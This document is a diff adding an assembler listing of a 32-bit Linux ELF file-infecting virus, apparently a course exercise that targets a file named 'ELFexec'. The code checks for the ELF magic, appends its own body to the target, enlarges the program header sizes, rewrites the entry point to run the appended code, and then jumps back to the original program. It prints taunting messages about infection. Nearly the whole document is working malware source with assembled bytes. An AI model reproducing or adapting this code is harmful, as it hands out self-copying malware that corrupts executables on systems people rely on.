@@ -1,0 +1,441 @@
+     1                                  %macro	syscall1 2
+     2                                  	mov	ebx, %2
+     3                                  	mov	eax, %1
+     4                                  	int	0x80
+     5                                  %endmacro
+     6                                  
+     7                                  %macro	syscall3 4
+     8                                  	mov	edx, %4
+     9                                  	mov	ecx, %3
+    10                                  	mov	ebx, %2
+    11                                  	mov	eax, %1
+    12                                  	int	0x80
+    13                                  %endmacro
+    14                                  
+    15                                  %macro  exit 1
+    16                                  	syscall1 1, %1
+    17                                  %endmacro
+    18                                  
+    19                                  %macro  write 3
+    20                                  	syscall3 4, %1, %2, %3
+    21                                  %endmacro
+    22                                  
+    23                                  %macro  read 3
+    24                                  	syscall3 3, %1, %2, %3
+    25                                  %endmacro
+    26                                  
+    27                                  %macro  open 3
+    28                                  	syscall3 5, %1, %2, %3
+    29                                  %endmacro
+    30                                  
+    31                                  %macro  lseek 3
+    32                                  	syscall3 19, %1, %2, %3
+    33                                  %endmacro
+    34                                  
+    35                                  %macro  close 1
+    36                                  	syscall1 6, %1
+    37                                  %endmacro
+    38                                  
+    39                                  %macro print 3
+    40                                  	call get_my_loc  ; get run time possition of anchor
+    41                                  	add edx, (%2 - anchor)  ; calculate runtime possition of Outstr
+    42                                  	mov eax, edx
+    43                                  	write %1, eax, %3 ; write to srdout
+    44                                  %endmacro
+    45                                  
+    46                                  %define	STK_RES	200
+    47                                  %define	RDWR	2
+    48                                  %define PREM_RW_ALL 0777
+    49                                  %define	SEEK_END 2
+    50                                  %define SEEK_SET 0
+    51                                  %define STDOUT 1
+    52                                  %define STDERR 2
+    53                                  
+    54                                  %define ELFHDR_SIZE 52
+    55                                  %define ENTRY		24
+    56                                  %define PHDR_start	28
+    57                                  %define	PHDR_size	32
+    58                                  %define PHDR_memsize	20
+    59                                  %define PHDR_filesize	16
+    60                                  %define	PHDR_offset	4
+    61                                  %define	PHDR_vaddr	8
+    62                                  
+    63                                  %define OutStr_SIZE 47
+    64                                  %define ErrOpen_SIZE 132
+    65                                  %define ErrClose_SIZE 20
+    66                                  %define ErrRead_SIZE 25
+    67                                  %define ErrWrite_SIZE 23
+    68                                  %define ErrElf_SIZE 23
+    69                                  
+    70                                  %define FD [ebp-4]
+    71                                  %define FILE_SIZE [ebp-8]
+    72                                  %define VIRUS_SIZE [ebp-12]
+    73                                  %define VADDR [ebp-16]
+    74                                  %define BUF [ebp-STK_RES]
+    75                                  	global _start
+    76                                  
+    77                                  section .text
+    78 00000000 55                      _start:	push	ebp
+    79 00000001 89E5                    	mov	ebp, esp
+    80 00000003 81ECC8000000            	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
+    81                                  
+    82                                  ; print message
+    83                                  print STDOUT, OutStr, OutStr_SIZE
+    84 00000009 E8EF020000          <1>  call get_my_loc
+    85 0000000E 83C20A              <1>  add edx, (%2 - anchor)
+    86 00000011 89D0                <1>  mov eax, edx
+    87                              <1>  write %1, eax, %3
+    88                              <2>  syscall3 4, %1, %2, %3
+    89 00000013 BA2F000000          <3>  mov edx, %4
+    90 00000018 89C1                <3>  mov ecx, %3
+    91 0000001A BB01000000          <3>  mov ebx, %2
+    92 0000001F B804000000          <3>  mov eax, %1
+    93 00000024 CD80                <3>  int 0x80
+    94                                  
+    95                                  ; open file
+    96 00000026 E8D2020000              call get_my_loc  ; get run time possition of anchor
+    97 0000002B 83C202                  add edx, FileName - anchor	; calculate runtime possition of FileName
+    98 0000002E 89D0                    mov eax, edx
+    99                                  open eax, RDWR, PREM_RW_ALL ; write to srdout
+   100                              <1>  syscall3 5, %1, %2, %3
+   101 00000030 BA09030000          <2>  mov edx, %4
+   102 00000035 B902000000          <2>  mov ecx, %3
+   103 0000003A 89C3                <2>  mov ebx, %2
+   104 0000003C B805000000          <2>  mov eax, %1
+   105 00000041 CD80                <2>  int 0x80
+   106 00000043 83F800                  cmp eax, 0
+   107 00000046 0F8CD6010000            jl Err_Open	; if there was an error opening the file printberror and exit
+   108 0000004C 8945FC                  mov FD, eax ; save fd on stack (at [ebp-4])
+   109                                  
+   110                                  ; check ELF format
+   111 0000004F 8D8D38FFFFFF            lea ecx, BUF	; use stack ass buffer
+   112                                  read eax, ecx, 4	; read 4 bytes from file
+   113                              <1>  syscall3 3, %1, %2, %3
+   114 00000055 BA04000000          <2>  mov edx, %4
+   115 0000005A 89C9                <2>  mov ecx, %3
+   116 0000005C 89C3                <2>  mov ebx, %2
+   117 0000005E B803000000          <2>  mov eax, %1
+   118 00000063 CD80                <2>  int 0x80
+   119 00000065 83F804                  cmp eax, 4
+   120 00000068 0F8C0B020000            jl Err_Read
+   121 0000006E 81BD38FFFFFF7F454C-     cmp dword BUF, 0x464c457f	; compare to ELF magic numbers
+   122 00000077 46                 
+   123 00000078 0F8553020000            jne Err_Elf	; if the file is not in elf format print error and exit
+   124                                  
+   125                                  ; seek to end of file and get file size
+   126 0000007E 8B5DFC                  mov ebx, FD
+   127                                  lseek ebx, 0, SEEK_SET ; seek to sart of file
+   128                              <1>  syscall3 19, %1, %2, %3
+   129 00000081 BA00000000          <2>  mov edx, %4
+   130 00000086 B900000000          <2>  mov ecx, %3
+   131 0000008B 89DB                <2>  mov ebx, %2
+   132 0000008D B813000000          <2>  mov eax, %1
+   133 00000092 CD80                <2>  int 0x80
+   134                                  lseek ebx, 0, SEEK_END ; seek to end of file
+   135                              <1>  syscall3 19, %1, %2, %3
+   136 00000094 BA02000000          <2>  mov edx, %4
+   137 00000099 B900000000          <2>  mov ecx, %3
+   138 0000009E 89DB                <2>  mov ebx, %2
+   139 000000A0 B813000000          <2>  mov eax, %1
+   140 000000A5 CD80                <2>  int 0x80
+   141 000000A7 8945F8                  mov FILE_SIZE, eax ; save file size on stak (at [ebp-8])
+   142                                  
+   143                                  ; get virus size
+   144 000000AA B800000000              mov eax, 0
+   145 000000AF 052B040000              add eax, (virus_end - _start)
+   146 000000B4 8945F4                  mov VIRUS_SIZE, eax	;	save virus size on stack (at [ebp-12])
+   147                                  
+   148                                  ; write virus to end of file
+   149 000000B7 E841020000              call get_my_loc
+   150 000000BC 81EA02030000            sub edx, (anchor - _start)
+   151 000000C2 89D1                    mov ecx, edx
+   152 000000C4 8B45F4                  mov eax, VIRUS_SIZE
+   153                                  write ebx, ecx, eax
+   154                              <1>  syscall3 4, %1, %2, %3
+   155 000000C7 89C2                <2>  mov edx, %4
+   156 000000C9 89C9                <2>  mov ecx, %3
+   157 000000CB 89DB                <2>  mov ebx, %2
+   158 000000CD B804000000          <2>  mov eax, %1
+   159 000000D2 CD80                <2>  int 0x80
+   160 000000D4 3B45F4                  cmp eax, VIRUS_SIZE
+   161 000000D7 0F8CC8010000            jl Err_Write
+   162                                  
+   163                                  ; copy files elf header to stack
+   164                                  lseek ebx, 0, SEEK_SET ; seek to sart of file
+   165                              <1>  syscall3 19, %1, %2, %3
+   166 000000DD BA00000000          <2>  mov edx, %4
+   167 000000E2 B900000000          <2>  mov ecx, %3
+   168 000000E7 89DB                <2>  mov ebx, %2
+   169 000000E9 B813000000          <2>  mov eax, %1
+   170 000000EE CD80                <2>  int 0x80
+   171 000000F0 8D8D38FFFFFF            lea ecx, BUF
+   172                                  read ebx, ecx, ELFHDR_SIZE
+   173                              <1>  syscall3 3, %1, %2, %3
+   174 000000F6 BA34000000          <2>  mov edx, %4
+   175 000000FB 89C9                <2>  mov ecx, %3
+   176 000000FD 89DB                <2>  mov ebx, %2
+   177 000000FF B803000000          <2>  mov eax, %1
+   178 00000104 CD80                <2>  int 0x80
+   179 00000106 83F834                  cmp eax, ELFHDR_SIZE
+   180 00000109 0F8C6A010000            jl Err_Read
+   181                                  
+   182                                  ;copy files program header to stack
+   183 0000010F 83C11C                  add ecx, PHDR_start ; get pointer to e_phoff in mapped elf header
+   184 00000112 8B09                    mov ecx, dword[ecx] ; get e_phoff
+   185                                  lseek ebx, ecx, SEEK_SET ; seek to start of program headers in file
+   186                              <1>  syscall3 19, %1, %2, %3
+   187 00000114 BA00000000          <2>  mov edx, %4
+   188 00000119 89C9                <2>  mov ecx, %3
+   189 0000011B 89DB                <2>  mov ebx, %2
+   190 0000011D B813000000          <2>  mov eax, %1
+   191 00000122 CD80                <2>  int 0x80
+   192 00000124 8D8D38FFFFFF            lea ecx, BUF
+   193 0000012A 83C134                  add ecx, ELFHDR_SIZE ; get pointer to the end of mapped elf header on stack
+   194                                  read ebx, ecx, PHDR_size ; read single program header to stack after elf header
+   195                              <1>  syscall3 3, %1, %2, %3
+   196 0000012D BA20000000          <2>  mov edx, %4
+   197 00000132 89C9                <2>  mov ecx, %3
+   198 00000134 89DB                <2>  mov ebx, %2
+   199 00000136 B803000000          <2>  mov eax, %1
+   200 0000013B CD80                <2>  int 0x80
+   201 0000013D 83F820                  cmp eax, PHDR_size
+   202 00000140 0F8C33010000            jl Err_Read
+   203                                  
+   204                                  ; get programs virtual address
+   205 00000146 8B4108                  mov eax, dword [ecx + PHDR_vaddr] ; get programs virtual address
+   206 00000149 8945F0                  mov VADDR, eax ; save programs virtual address on stack (at [ebp-16])
+   207                                  
+   208                                  ; modify mapped program headers file and mem sizes to encompass the virus code
+   209 0000014C 8B45F4                  mov eax, VIRUS_SIZE
+   210 0000014F 014114                  add dword [ecx + PHDR_memsize], eax
+   211 00000152 014110                  add dword [ecx + PHDR_filesize], eax
+   212                                  
+   213                                  ; save original entry opint under PreviousEntryPoint at the viruses copy in the file
+   214                                  lseek ebx, -4, SEEK_END ; seek to PreviousEntryPoint decleration at the copy of virus in the file
+   215                              <1>  syscall3 19, %1, %2, %3
+   216 00000155 BA02000000          <2>  mov edx, %4
+   217 0000015A B9FCFFFFFF          <2>  mov ecx, %3
+   218 0000015F 89DB                <2>  mov ebx, %2
+   219 00000161 B813000000          <2>  mov eax, %1
+   220 00000166 CD80                <2>  int 0x80
+   221 00000168 8D8D38FFFFFF            lea ecx, BUF ; get pointer to mapped elf header
+   222 0000016E 83C118                  add ecx, ENTRY ; get pointer to entry point in mapped elf header
+   223                                  write ebx, ecx, 4  ; save original entry opint under PreviousEntryPoint at the viruses copy in the file
+   224                              <1>  syscall3 4, %1, %2, %3
+   225 00000171 BA04000000          <2>  mov edx, %4
+   226 00000176 89C9                <2>  mov ecx, %3
+   227 00000178 89DB                <2>  mov ebx, %2
+   228 0000017A B804000000          <2>  mov eax, %1
+   229 0000017F CD80                <2>  int 0x80
+   230 00000181 83F804                  cmp eax, 4
+   231 00000184 0F8C1B010000            jl Err_Write
+   232                                  
+   233                                  ; chenge entry point to the virus code (at runtime) in the mapped elf headers
+   234 0000018A 8B45F8                  mov eax, FILE_SIZE
+   235 0000018D 0345F0                  add eax, VADDR ; get start of virus code at ELFexecs execution
+   236 00000190 8901                    mov dword [ecx], eax ; update entry opint in mapped elf header
+   237                                  
+   238                                  ; write modified elf header back to file
+   239                                  lseek ebx, 0, SEEK_SET ; seek to sart of file
+   240                              <1>  syscall3 19, %1, %2, %3
+   241 00000192 BA00000000          <2>  mov edx, %4
+   242 00000197 B900000000          <2>  mov ecx, %3
+   243 0000019C 89DB                <2>  mov ebx, %2
+   244 0000019E B813000000          <2>  mov eax, %1
+   245 000001A3 CD80                <2>  int 0x80
+   246 000001A5 8D8D38FFFFFF            lea ecx, BUF
+   247                                  write ebx, ecx, ELFHDR_SIZE
+   248                              <1>  syscall3 4, %1, %2, %3
+   249 000001AB BA34000000          <2>  mov edx, %4
+   250 000001B0 89C9                <2>  mov ecx, %3
+   251 000001B2 89DB                <2>  mov ebx, %2
+   252 000001B4 B804000000          <2>  mov eax, %1
+   253 000001B9 CD80                <2>  int 0x80
+   254 000001BB 83F834                  cmp eax, ELFHDR_SIZE
+   255 000001BE 0F8CE1000000            jl Err_Write
+   256                                  
+   257                                  ; write modified program header back to file
+   258 000001C4 8B491C                  mov ecx, dword [ecx+PHDR_start]
+   259                                  lseek ebx, ecx, SEEK_SET ;seek to start of program headers in file
+   260                              <1>  syscall3 19, %1, %2, %3
+   261 000001C7 BA00000000          <2>  mov edx, %4
+   262 000001CC 89C9                <2>  mov ecx, %3
+   263 000001CE 89DB                <2>  mov ebx, %2
+   264 000001D0 B813000000          <2>  mov eax, %1
+   265 000001D5 CD80                <2>  int 0x80
+   266 000001D7 8D8D38FFFFFF            lea ecx, BUF
+   267 000001DD 83C134                  add ecx, ELFHDR_SIZE ; get pointer to mapped (and modified) program header
+   268                                  write ebx, ecx, PHDR_size
+   269                              <1>  syscall3 4, %1, %2, %3
+   270 000001E0 BA20000000          <2>  mov edx, %4
+   271 000001E5 89C9                <2>  mov ecx, %3
+   272 000001E7 89DB                <2>  mov ebx, %2
+   273 000001E9 B804000000          <2>  mov eax, %1
+   274 000001EE CD80                <2>  int 0x80
+   275 000001F0 83F820                  cmp eax, PHDR_size
+   276 000001F3 0F8CAC000000            jl Err_Write
+   277                                  
+   278                                  ;close file
+   279                                  close ebx
+   280                              <1>  syscall1 6, %1
+   281 000001F9 89DB                <2>  mov ebx, %2
+   282 000001FB B806000000          <2>  mov eax, %1
+   283 00000200 CD80                <2>  int 0x80
+   284 00000202 83F800                  cmp eax, 0
+   285 00000205 7C46                    jl Err_Close
+   286                                  
+   287                                  ; resume Infected program or exit
+   288                                  resume_infected:
+   289 00000207 E8F1000000              call get_my_loc
+   290 0000020C 81C225010000            add edx, (PreviousEntryPoint - anchor)
+   291 00000212 8B02                    mov eax, dword [edx]
+   292 00000214 FFE0                    jmp eax
+   293                                  
+   294                                  VirusExit:
+   295                                         exit 0            ; Termination if all is OK and no previous code to jump to
+   296                              <1>  syscall1 1, %1
+   297 00000216 BB00000000          <2>  mov ebx, %2
+   298 0000021B B801000000          <2>  mov eax, %1
+   299 00000220 CD80                <2>  int 0x80
+   300                                                           ; (also an example for use of above macros)
+   301                                  
+   302                                  ; print open error and exit
+   303                                  Err_Open:
+   304                                  	print STDERR, ErrOpen, ErrOpen_SIZE
+   305 00000222 E8D6000000          <1>  call get_my_loc
+   306 00000227 83C246              <1>  add edx, (%2 - anchor)
+   307 0000022A 89D0                <1>  mov eax, edx
+   308                              <1>  write %1, eax, %3
+   309                              <2>  syscall3 4, %1, %2, %3
+   310 0000022C BA84000000          <3>  mov edx, %4
+   311 00000231 89C1                <3>  mov ecx, %3
+   312 00000233 BB02000000          <3>  mov ebx, %2
+   313 00000238 B804000000          <3>  mov eax, %1
+   314 0000023D CD80                <3>  int 0x80
+   315 0000023F EBC6                    	jmp resume_infected
+   316                                  	exit 1
+   317                              <1>  syscall1 1, %1
+   318 00000241 BB01000000          <2>  mov ebx, %2
+   319 00000246 B801000000          <2>  mov eax, %1
+   320 0000024B CD80                <2>  int 0x80
+   321                                  
+   322                                  ; print open error and exit
+   323                                  Err_Close:
+   324                                  	print STDERR, ErrClose, ErrClose_SIZE
+   325 0000024D E8AB000000          <1>  call get_my_loc
+   326 00000252 81C2CA000000        <1>  add edx, (%2 - anchor)
+   327 00000258 89D0                <1>  mov eax, edx
+   328                              <1>  write %1, eax, %3
+   329                              <2>  syscall3 4, %1, %2, %3
+   330 0000025A BA14000000          <3>  mov edx, %4
+   331 0000025F 89C1                <3>  mov ecx, %3
+   332 00000261 BB02000000          <3>  mov ebx, %2
+   333 00000266 B804000000          <3>  mov eax, %1
+   334 0000026B CD80                <3>  int 0x80
+   335                                  	exit 1 ; exit with exit code 1
+   336                              <1>  syscall1 1, %1
+   337 0000026D BB01000000          <2>  mov ebx, %2
+   338 00000272 B801000000          <2>  mov eax, %1
+   339 00000277 CD80                <2>  int 0x80
+   340                                  
+   341                                  ; print open error and exit
+   342                                  Err_Read:
+   343                                  	print STDERR, ErrRead, ErrRead_SIZE
+   344 00000279 E87F000000          <1>  call get_my_loc
+   345 0000027E 81C2DE000000        <1>  add edx, (%2 - anchor)
+   346 00000284 89D0                <1>  mov eax, edx
+   347                              <1>  write %1, eax, %3
+   348                              <2>  syscall3 4, %1, %2, %3
+   349 00000286 BA19000000          <3>  mov edx, %4
+   350 0000028B 89C1                <3>  mov ecx, %3
+   351 0000028D BB02000000          <3>  mov ebx, %2
+   352 00000292 B804000000          <3>  mov eax, %1
+   353 00000297 CD80                <3>  int 0x80
+   354                                  	exit 1 ; exit with exit code 1
+   355                              <1>  syscall1 1, %1
+   356 00000299 BB01000000          <2>  mov ebx, %2
+   357 0000029E B801000000          <2>  mov eax, %1
+   358 000002A3 CD80                <2>  int 0x80
+   359                                  
+   360                                  ; print open error and exit
+   361                                  Err_Write:
+   362                                  	print STDERR, ErrWrite, ErrWrite_SIZE
+   363 000002A5 E853000000          <1>  call get_my_loc
+   364 000002AA 81C2F7000000        <1>  add edx, (%2 - anchor)
+   365 000002B0 89D0                <1>  mov eax, edx
+   366                              <1>  write %1, eax, %3
+   367                              <2>  syscall3 4, %1, %2, %3
+   368 000002B2 BA17000000          <3>  mov edx, %4
+   369 000002B7 89C1                <3>  mov ecx, %3
+   370 000002B9 BB02000000          <3>  mov ebx, %2
+   371 000002BE B804000000          <3>  mov eax, %1
+   372 000002C3 CD80                <3>  int 0x80
+   373                                  	exit 1 ; exit with exit code 1
+   374                              <1>  syscall1 1, %1
+   375 000002C5 BB01000000          <2>  mov ebx, %2
+   376 000002CA B801000000          <2>  mov eax, %1
+   377 000002CF CD80                <2>  int 0x80
+   378                                  
+   379                                  ; print error elf and exit
+   380                                  Err_Elf:
+   381                                  	print STDERR, ErrElf, ErrElf_SIZE
+   382 000002D1 E827000000          <1>  call get_my_loc
+   383 000002D6 81C20E010000        <1>  add edx, (%2 - anchor)
+   384 000002DC 89D0                <1>  mov eax, edx
+   385                              <1>  write %1, eax, %3
+   386                              <2>  syscall3 4, %1, %2, %3
+   387 000002DE BA17000000          <3>  mov edx, %4
+   388 000002E3 89C1                <3>  mov ecx, %3
+   389 000002E5 BB02000000          <3>  mov ebx, %2
+   390 000002EA B804000000          <3>  mov eax, %1
+   391 000002EF CD80                <3>  int 0x80
+   392                                  	exit 1 ; exit with exit code 1
+   393                              <1>  syscall1 1, %1
+   394 000002F1 BB01000000          <2>  mov ebx, %2
+   395 000002F6 B801000000          <2>  mov eax, %1
+   396 000002FB CD80                <2>  int 0x80
+   397                                  
+   398                                  get_my_loc:
+   399 000002FD E800000000              	call anchor
+   400 00000302 5A                      anchor: pop edx
+   401 00000303 C3                      	ret
+   402                                  
+   403 00000304 454C466578656300        FileName:	db "ELFexec", 0
+   404 0000030C 4973206974206A7573-     OutStr:		db "Is it just me, or did you just get infected?!", 10, 0
+   405 00000315 74206D652C206F7220-
+   406 0000031E 64696420796F75206A-
+   407 00000327 757374206765742069-
+   408 00000330 6E6665637465643F21-
+   409 00000339 0A00               
+   410 0000033B 70657268617073206E-     Failstr:  db "perhaps not", 10, 0
+   411 00000344 6F740A00           
+   412 00000348 536F7272792063616E-     ErrOpen: 	db "Sorry cant open this file because I am probably running in it right now!", 10,"Wow Inception...",10,"So Ill just resume the infected program.",10,0
+   413 00000351 74206F70656E207468-
+   414 0000035A 69732066696C652062-
+   415 00000363 656361757365204920-
+   416 0000036C 616D2070726F626162-
+   417 00000375 6C792072756E6E696E-
+   418 0000037E 6720696E2069742072-
+   419 00000387 69676874206E6F7721-
+   420 00000390 0A576F7720496E6365-
+   421 00000399 7074696F6E2E2E2E0A-
+   422 000003A2 536F20496C6C206A75-
+   423 000003AB 737420726573756D65-
+   424 000003B4 2074686520696E6665-
+   425 000003BD 637465642070726F67-
+   426 000003C6 72616D2E0A00       
+   427 000003CC 4572726F72206F7065-     ErrClose: db "Error opening file", 10, 0
+   428 000003D5 6E696E672066696C65-
+   429 000003DE 0A00               
+   430 000003E0 4572726F7220726561-     ErrRead: db "Error reading from file", 10, 0
+   431 000003E9 64696E672066726F6D-
+   432 000003F2 2066696C650A00     
+   433 000003F9 4572726F7220777269-     ErrWrite: db "Error writing to file", 10, 0
+   434 00000402 74696E6720746F2066-
+   435 0000040B 696C650A00         
+   436 00000410 4572726F72206E6F74-     ErrElf: 	db "Error not an ELF file", 10, 0
+   437 00000419 20616E20454C462066-
+   438 00000422 696C650A00         
+   439 00000427 [16020000]              PreviousEntryPoint: dd VirusExit
+   440                                  virus_end:
+   441                                  
